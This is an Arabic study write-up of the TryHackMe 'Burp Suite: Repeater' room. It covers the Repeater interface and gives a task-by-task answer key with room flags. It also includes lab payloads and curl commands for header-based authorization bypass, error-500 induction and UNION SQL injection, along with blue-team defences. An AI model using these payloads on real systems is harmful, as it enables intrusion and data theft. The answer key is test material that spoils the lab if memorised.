# غرفة مكرر بيرب سويت (Burp Suite: Repeater)

---

## 1. بطاقة التعريف والبيانات الوصفية (Metadata & Overview)

* **المسار التعليمي:** Jr Penetration Tester (مسار مختبر الاختراق المبتدئ - المنهج المعتمد)
* **الموديول:** الموديول السادس - Burp Suite (أداة بيرب سويت)
* **رقم الغرفة:** الغرفة الثانية (Room 02 / 06)
* **اسم الغرفة في المنصة:** Burp Suite: Repeater
* **رابط الغرفة الرسمي:** [TryHackMe - Burp Suite: Repeater](https://tryhackme.com/room/burpsuiterepeater)
* **مستوى الصعوبة:** سهل / تمهيدي (Easy / Walkthrough)
* **الهدف التكتيكي:** إتقان التعديل اليدوي وإعادة الإرسال الفوري لطلبات HTTP، استكشاف واجهة Inspector، التلاعب بالترويسات، استدراج أخطاء الخادم الداخلية (HTTP 500)، واستغلال ثغرات حقن SQL القائمة على الاتحاد (UNION SQLi).

---

## 2. الملخص التنفيذي (Executive Summary)

تُعد وحدة **Repeater** بمثابة طاولة العمل التكتيكية الأساسية (Tactical Workbench) لمختبر تطبيقات الويب. بينما تقتصر وظيفة المتصفح العادي على استهلاك الردود وتصييرها رسومياً، وتمثل وحدة الوكيل (Proxy) نقطة التقاط سلبية لحركة المرور، تمنحك أداة Repeater القدرة على عزل أي طلب HTTP والتحكم فيه بايت ببايت.

خلال هذه الغرفة، نستعرض كيفية أخذ لقطة فورية للطلب من سجلات الوكيل ونقلها عبر اختصار `Ctrl + R` إلى مساحة عمل مكرر الطلبات. نغوص في تشريح لوحات الواجهة: لوحة الطلب (Request Pane)، لوحة الاستجابة (Response Pane)، وشريط تحليل الرسائل الذي يوفر أربعة مناظير تكميلية (Pretty, Raw, Hex, Render). كما نستثمر لوحة **Inspector** لتفكيك معطيات الطلب وتحرير معاملات الاستعلام والترويسات ومعاملات جسم POST (`Body Parameters`).

تتوج الغرفة بثلاثة تطبيقات عملية عميقة:
1. تجاوز بوابة تفويض سطحية عبر حقن ترويسة مخصصة (`FlagAuthorised: True`).
2. استدراج خطأ برمجي غير معالج (Unhandled Exception) أدى إلى انهيار الخادم برمز 500 وتسريب راية التشخيص.
3. استغلال متقدم لثغرة حقن SQL عبر مشغل `UNION SELECT` لتحديد عدد الأعمدة وسحب بيانات سرية من جدول الأشخاص `people`.

---

## 3. مخطط البنية المعمارية وتدفق العمليات (Architecture & Workflow Diagram)

```mermaid
flowchart TD
    subgraph Capture["مرحلة الالتقاط (Traffic Capture)"]
        A["متصفح الويب (Browser)"] -->|"إرسال طلب HTTP"| B["Burp Proxy (Interception)"]
        B -->|"تسجيل في السجل التاريخي"| C["HTTP History"]
    end

    subgraph RepeaterModule["وحدة المكرر (Burp Repeater)"]
        C -->|"Ctrl + R (Send to Repeater)"| D["Request View (Raw / Inspector)"]
        D -->|"تعديل البارامترات والترويسات"| E{"نوع الاختبار"}
        
        E -->|"تعديل الترويسات"| F["Header Tampering<br/>FlagAuthorised: True"]
        E -->|"فحص الحدود والشذوذ"| G["Boundary Fuzzing<br/>/products/-1 -> 500 Error"]
        E -->|"حقن قواعد البيانات"| H["UNION SQLi<br/>UNION ALL SELECT notes..."]
        
        F & G & H -->|"Ctrl + Space (إرسال مباشر)"| I["TCP Socket to Target Server"]
    end

    subgraph TargetAnalysis["تحليل الاستجابة (Response Analysis)"]
        I -->|"استقبال البايتات الخام"| J["Response View"]
        J --> K["Pretty: قراءة JSON/HTML المنسق"]
        J --> L["Raw: فحص الترويسات وأكواد CRLF"]
        J --> M["Hex: فحص البايتات الثنائية والتواقيع"]
        J --> N["Render: تصيير الصفحة كمتصفح"]
    end
```



---

## 4. المتطلبات المسبقة والتهيئة المعملية (Prerequisites & Lab Setup)

1. **البرمجيات المطلوبة:**
   * تثبيت منصة **Burp Suite Community Edition** (أو Professional).
   * متصفح Burp المدمج (Burp Embedded Browser) لضمان توجيه حركة المرور تلقائياً عبر الوكيل دون الحاجة لضبط شهادات CA يدوياً.
2. **بدء تشغيل الآلة المعملية:**
   * النقر على زر **Start Machine** في الغرفة للحصول على عنوان `MACHINE_IP`.
   * اختبار الاتصال بالهدف عبر الشبكة الافتراضية (VPN / AttackBox):
     ```bash
     ping -c 3 MACHINE_IP
     ```
3. **ضبط نفق الوكيل:**
   * التأكد من أن الوكيل يستمع افتراضياً على المنفذ `127.0.0.1:8080`.
   * التأكد من تعطيل وضع الاعتراض الفوري (`Intercept is off`) للسماح للمتصفح بالتحميل الطبيعي حتى يتم التقاط الطلب المطلوب من السجل.

---

## 5. المفاهيم الأساسية والعمق النظري (Core Concepts & Theoretical Deep Dive)

### أ. العزل التام لحالة الطلب (State Isolation):
عندما تقوم بنسخ طلب إلى Repeater، فإنك تنشئ نسخة منفصلة تماماً في الذاكرة. الطلبات الأصلية في تاريخ الوكيل تظل دون تغيير. هذا يمنح المختبر بيئة معزولة لإجراء تجارب تخريبية أو إرسال حمولات تكسر التشفير دون التأثير على التصفح النشط.

### ب. تفكيك مكونات لوحة المفتش (Inspector Breakdown):
تتعامل لوحة **Inspector** مع المعاملات بطريقة برمجية منظمة:
* **Request Attributes:** لتغيير نوع الدالة البروتوكولية (`GET`, `POST`, `PUT`) ومسار المورد.
* **Query Parameters:** تعديل متغيرات الرابط المشفرة تلقائياً.
* **Body Parameters:** القسم المخصص لطلبات `POST` لمعالجة حقول النماذج بصيغة `application/x-www-form-urlencoded`.
* **Request Headers:** تعديل وحذف وإضافة الترويسات دون المساس بأسطر الفواصل الحساسة.
* **Request Cookies:** تعديل ملفات تعريف الارتباط واختبار سرقة الجلسات أو التلاعب بصلاحيات المستخدم.

### ج. هندسة هجوم الاتحاد (UNION SQL Injection Mechanics):
يقوم مشغل `UNION` بدمج نتائج استعلامين في جدول نتيجة موحد. لتحقيق ذلك بنجاح:
1. **تساوي عدد الحقول:** يجب أن يتطابق عدد الأعمدة المستعلم عنها في الجملة المحقونة مع استعلام الخادم الأصلي.
2. **توافق الأنواع:** يجب أن تتطابق أنواع البيانات في كل عمود (نصوص، أرقام، تواريخ).
3. **إخفاء نتائج الاستعلام الأصلي:** إجبار الاستعلام الأول على إرجاع صفر صفوف (عبر تمرير معرّف غير صالح مثل `0` أو رقم سالب)، حتى تنعكس صفوف الاستعلام المحقون في الواجهة.

---

## 6. استعراض الغرفة وهيكل التنقل (Room Breakdown & Navigation)

تتألف الغرفة من 9 مهام منهجية مترابطة:
* **المهمة 01:** مدخل مفاهيمي والتعريف بدور المكرر اليدوي.
* **المهمة 02:** الهيكل الرسومي للوحدة والتعرف على لوحة **Inspector**.
* **المهمة 03:** الاستخدام الأساسي ونقل الطلبات عبر `Ctrl + R` إلى لوحة **Request**.
* **المهمة 04:** شريط تحليل الرسائل وتوظيف نمط **Render** لمحاكاة المتصفح.
* **المهمة 05:** الاستخدام المعمق للوحة Inspector والتعرف على قسم **Body Parameters**.
* **المهمة 06:** تمرين عملي على حقن الترويسات (`FlagAuthorised: True`) وتجاوز التحقق الساذج.
* **المهمة 07:** تمرين التحدي: استدراج خطأ 500 عبر تمرير قيم سالبة للحدود واستخراج الراية.
* **المهمة 08:** تمرين التحدي المتقدم: كشف واستغلال ثغرة UNION SQLi وسحب الراية من قاعدة البيانات.
* **المهمة 09:** الخاتمة واستراتيجية الانتقال نحو أداة Burp Intruder.

---

## 7. ملخص المهام والحلول العملية (Task-by-Task Implementation Summary)

| رقم المهمة | اسم المهمة (Task Name) | السؤال المعتمد (Question) | الإجابة المستخرجة (Extracted Value) | رابط ملف المرحلة السبع |
| :---: | :--- | :--- | :--- | :---: |
| **01** | Introduction | Let's get started! | `No answer needed` | [TASK-01.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-01.md) |
| **02** | What is Repeater? | Which section provides an intuitive interface for editing requests? | `Inspector` | [TASK-02.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-02.md) |
| **03** | Basic Usage | Which view will be populated when we send a request from the Proxy to Repeater? | `Request` | [TASK-03.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-03.md) |
| **04** | Message Analysis Toolbar | Which view option displays the response as it would appear in a browser? | `Render` | [TASK-04.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-04.md) |
| **05** | Inspector | Which section in the Inspector is specific to POST requests? | `Body Parameters` | [TASK-05.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-05.md) |
| **06** | Practical Example | Capture request... add FlagAuthorised header... | `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}` | [TASK-06.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-06.md) |
| **07** | Challenge | See if you can get the server to return an error 500... | `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}` | [TASK-07.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-07.md) |
| **08** | Extra-mile Challenge | Exploit union-based SQL injection on /about/ID... | `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}` | [TASK-08.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-08.md) |
| **09** | Conclusion | I can now use Repeater to manually edit and resend... | `No answer needed` | [TASK-09.md](../../02-BURP-SUITE-REPEATER/TASKS/TASK-09.md) |

---

## 8. المعامل العملية والتطبيق الهجومي المباشر (Practical Labs & Hands-on Exploitation)

### المختبر الأول: تجاوز ضوابط الوصول عبر الترويسات (Header Tampering):
* **نقطة النهاية:** `/flag/1`
* **الحمولة المحقونة:**
  ```http
  FlagAuthorised: True
  ```
* **النتيجة:** استجابة الخادم بالراية: `THM{Yzg2MWI2ZDhlYzdlNGFiZTUzZTIzMzVi}`.

### المختبر الثاني: استدراج خطأ الخادم 500 (Unhandled Runtime Exception):
* **نقطة النهاية:** `/products/ID`
* **الحمولة المحقونة:**
  ```http
  GET /products/-1 HTTP/1.1
  ```
* **النتيجة:** انهيار الخادم وعرض تفاصيل التصحيح التي تحمل الراية: `THM{N2MzMzFhMTA1MmZiYjA2YWQ4M2ZmMzhl}`.

### المختبر الثالث: حقن SQL واستخراج البيانات (UNION SQLi):
* **نقطة النهاية:** `/about/ID`
* **الحمولة المحقونة:**
  ```http
  GET /about/0%20UNION%20ALL%20SELECT%20notes,null,null,null,null%20FROM%20people%20WHERE%20id%20=%201 HTTP/1.1
  ```
* **النتيجة:** استخراج راية جدول الأشخاص: `THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}`.

---

## 9. تطبيقات الفريق الأحمر والمناورات الهجومية (Red Team Applications)

* **التعديل الجراحي السريع (Surgical Tampering):**
  عندما يكتشف المهاجم نقطة ضعف في منطق العمل (Business Logic Vulnerability) مثل شراء منتج بسعر سالب، يوفر Repeater البيئة الأسرع لتعديل معطيات الأسعار في أجزاء من الثانية.
* **اختبار أزمنة الاستجابة (Timing Attacks):**
  قياس زمن استجابة الخادم بدقة المللي ثانية عند حقن دوال التأخير الزمني (مثل `pg_sleep(5)` أو `WAITFOR DELAY '0:0:5'`) لاكتشاف ثغرات Blind SQLi دون الحاجة لكتابة سكربتات خارجية معقدة.
* **تخطي فلاتر WAF المعقدة:**
  تجربة تقنيات ترميز متعددة (Double URL Encoding, UTF-8 overlong sequences) في نافذة الطلب ومراقبة استجابة الجدار الناري فوراً لمعرفة أي بايت تم حظره وأي بايت مر بنجاح.

---

## 10. استراتيجيات الفريق الأزرق والكشف الدفاعي (Blue Team & Detection Strategies)

### أ. حماية الخوادم من ثغرات الترويسات:
* عدم الاعتماد على ترويسات يقدمها العميل للتفويض. إذا كانت هناك حاجة لترويسات وسيطة (مثل `X-Forwarded-For`)، يجب على جدار الحماية أو البروكسي العكسي (Reverse Proxy) مسحها وإعادة كتابتها قبل تمرير الطلب للخوادم الداخلية.

### ب. إدارة الأخطاء ومنع تسريب البيانات (Safe Error Handling):
* تعطيل وضع التصحيح المباشر (`debug: false` أو `display_errors = Off`) في بيئات الإنتاج الحية.
* إعداد صفحات أخطاء مخصصة لا تكشف عن البنية الداخلية للخادم أو شفرات التتبع (Stack Traces).

### ج. الوقاية الصارمة من حقن SQL:
* استخدام الاستعلامات المجهزة والمعاملات المربوطة حصراً (Parameterized Queries / Prepared Statements):
  ```python
  # استعلام آمن غير قابل للحقن
  cursor.execute("SELECT name, title, bio FROM people WHERE id = %s", (user_id,))
  ```

---

## 11. استكشاف الأخطاء ومعالجة المشكلات التقنية (Troubleshooting & Edge Cases)

1. **الخادم يرجع خطأ 400 Bad Request بعد تعديل الطلب:**
   * **السبب:** نسيان سطر فارغ (`\r\n`) بين الترويسات وجسم الطلب في طلبات POST، أو وجود مسافات غير صالحة في سطر الطلب الأول.
   * **الحل:** استخدم لوحة **Inspector** لتعديل المعاملات، أو اضغط `Ctrl + Shift + U` لترميز المدخلات.
2. **الطلب يعلق (Hangs) ولا يستقبل استجابة:**
   * **السبب:** عدم تطابق قيمة ترويسة `Content-Length` مع طول جسم الطلب الحقيقي.
   * **الحل:** تأكد من تفعيل خيار `Repeater -> Update Content-Length` في القائمة العلوية.
3. **عرض Render يظهر صفحة بيضاء:**
   * **السبب:** الصفحة تعتمد كلياً على JavaScript لرسم واجهتها، بينما يعطل Burp تشغيل السكربتات افتراضياً لحماية بيئة التشغيل.
   * **الحل:** اعتمد على وجهتي **Pretty** و **Raw** لقراءة محتوى الاستجابة مباشرة.

---

## 12. مرجع الأوامر السريعة والاختصارات (Cheatsheet & Quick Reference)

### اختصارات لوحة المفاتيح في Repeater:
* `Ctrl + R`: إرسال الطلب من الوكيل إلى Repeater.
* `Ctrl + Space`: إرسال الطلب (Send) فوراً.
* `Ctrl + Shift + U`: ترميز أو فك ترميز الرابط (URL-encode/decode).
* `Ctrl + Z`: التراجع عن التعديل.

### أوامر سطر الأوامر البديلة (cURL Commands):
```bash
# 1. إرسال ترويسة مخصصة
curl -s -H "FlagAuthorised: True" "http://MACHINE_IP/flag/1"

# 2. استدراج خطأ الخادم عبر معرّف شاذ
curl -i "http://MACHINE_IP/products/-1"

# 3. استغلال UNION SQLi
curl -s "http://MACHINE_IP/about/0%20UNION%20ALL%20SELECT%20notes,null,null,null,null%20FROM%20people%20WHERE%20id%20=%201"
```

---

## 13. أسئلة التحقق ومراجعة الفهم (Knowledge Check & Verification)

* **س1:** ما الفارق الأساسي بين العمل داخل Burp Proxy والعمل داخل Burp Repeater؟
  * *ج:* الوكيل يعترض ويسجل حركة المرور الصادرة من المتصفح، بينما يوفر Repeater بيئة معزولة لتعديل الطلب وإعادة إرساله يدوياً مرات لا نهائية دون الاعتماد على المتصفح.
* **س2:** لماذا يجب ألا يعتمد الخادم على ترويسة مثل `FlagAuthorised: True` لمنح الصلاحيات؟
  * *ج:* لأن العميل يتحكم بشكل مطلق في جميع ترويسات HTTP، ويمكن لأي مستخدم أو مختبر تعديلها أو تزويرها بسهولة.
* **س3:** ما الشرطان الإلزاميان لنجاح هجوم `UNION SELECT` في قواعد بيانات SQL؟
  * *ج:* تطابق عدد الأعمدة بين الاستعلامين وتوافق أنواع البيانات في الأعمدة المتقابلة.

---

## 14. المراجع والمصادر التوثيقية (References & Further Reading)

* [PortSwigger Burp Suite Repeater Documentation](https://portswigger.net/burp/documentation/desktop/tools/repeater)
* [PortSwigger Web Security Academy: SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
* [IETF RFC 9110: HTTP Semantics](https://www.rfc-editor.org/rfc/rfc9110)
* [OWASP Top 10: A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
* [CWE-209: Generation of Error Message Containing Sensitive Information](https://cwe.mitre.org/data/definitions/209.html)
